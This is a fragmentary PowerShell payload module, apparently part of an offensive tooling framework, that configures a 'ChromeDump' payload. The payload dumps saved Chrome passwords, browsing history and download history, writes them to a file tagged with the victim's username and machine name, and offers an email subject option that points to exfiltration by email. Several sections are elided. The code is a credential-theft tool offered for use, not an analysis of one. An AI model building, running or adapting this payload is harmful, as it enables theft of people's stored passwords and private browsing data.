...
Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'ChromeDump'
		Author = '@H3LL0WORLD'
		Description = 'Dump any passwords, history or downloads history stored in the chrome sqlite databases.'
		Link = 'https://github.com/H3LL0WORLD/Powershell/blob/master/Exfiltration/Get-ChromeDump.ps1'
	...
	$Options = @{
		...
		'Parameters' = New-Object PSObject -Property @{
			'Name' = "Parameters"
			'Description' = "Get-ChromeDump parameters."
			'Required' = "True"
			'Value' = "-DumpCreds -DumpHistory -DumpDownloads"
		}
		'OutputFile' = New-Object PSObject -Property @{
			'Name' = "OutputFile"
			'Description' = "Path to Output file"
			'Required' = "True"
			'Value' = '$PWD\ChromeDump-$([Environment]::UserName)@$([Environment]::MachineName).txt'
		}
		...
		'EmailSubject' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = 'ChromeDump-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
	}
...
Function Add-Payload {
	...
	$Command = 'Get-ChromeDump ' + $Options.Parameters.Value
	$Command += ' -OutFile "' + $Options.OutputFile.Value + '";'
